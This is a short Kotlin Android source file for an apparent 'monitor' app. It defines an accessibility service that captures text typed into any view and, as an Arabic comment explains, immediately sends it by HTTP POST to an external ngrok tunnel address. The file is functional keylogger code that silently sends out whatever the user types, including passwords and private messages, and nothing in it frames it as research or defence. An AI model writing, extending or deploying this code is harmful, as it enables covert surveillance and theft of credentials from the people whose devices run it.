package com.example.monitorapp

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class MyAccessibilityService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.toString()
            Log.d("MonitorDebug", "Captured: $text")

            // إرسال البيانات إلى السيرفر الخارجي فوراً عبر الشبكة
            thread {
                try {
                    val url = URL("https://kilobyte-judicial-bonelike.ngrok-free.dev/receiver")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.doOutput = true
                    conn.setRequestProperty("Content-Type", "application/json")

                    val payload = "{\"data\":\"$text\"}"
                    conn.outputStream.write(payload.toByteArray())
                    conn.inputStream.close()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }

    override fun onInterrupt() {}
}
